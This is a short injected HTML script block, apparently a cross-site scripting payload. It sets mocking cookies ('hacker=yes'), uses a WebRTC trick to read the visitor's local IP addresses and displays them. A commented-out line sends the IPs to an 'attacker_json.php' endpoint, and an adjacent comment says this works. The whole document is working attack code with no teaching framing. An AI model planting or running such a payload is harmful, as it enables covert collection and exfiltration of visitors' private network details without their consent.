<script>
document.cookie = "hacker=yes";
document.cookie = "idiot=yes";
// taken from https://github.com/diafygi/webrtc-ips
function findIP(onNewIP) { //  onNewIp - your listener function for new IPs
  var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection; //compatibility for firefox and chrome
  var pc = new myPeerConnection({iceServers: []}),
    noop = function() {},
    localIPs = {},
    ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,
    key;
  function ipIterate(ip) {
    if (!localIPs[ip]) onNewIP(ip);
    localIPs[ip] = true;
  }
  pc.createDataChannel(""); //create a bogus data channel
  pc.createOffer(function(sdp) {
    sdp.sdp.split('\n').forEach(function(line) {
      if (line.indexOf('candidate') < 0) return;
      line.match(ipRegex).forEach(ipIterate);
    });
    pc.setLocalDescription(sdp, noop, noop);
  }, noop); // create offer and set local description
  pc.onicecandidate = function(ice) { //listen for candidate events
    if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
    ice.candidate.candidate.match(ipRegex).forEach(ipIterate);
  };
}
var ul = document.createElement('ul');
ul.textContent = 'Your IPs are: '
document.body.appendChild(ul);
function addIP(ip) {
  console.log('ip: ', ip);
  var li = document.createElement('li');
  li.textContent = ip;
  var cip = JSON.stringify(ip);
//  window.location = "attacker_json.php?ips=" + cip; # works and sends one ip to url and then apache logs, returns 404
  ul.appendChild(li);
}
findIP(addIP);
</script>
